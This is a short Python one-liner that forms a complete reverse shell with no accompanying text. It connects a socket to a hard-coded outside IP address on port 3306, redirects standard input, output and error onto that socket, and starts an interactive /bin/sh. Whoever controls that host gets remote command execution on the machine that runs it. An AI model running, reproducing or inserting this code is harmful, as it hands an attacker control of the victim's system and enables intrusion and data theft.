import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("47.245.35.202",3306));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
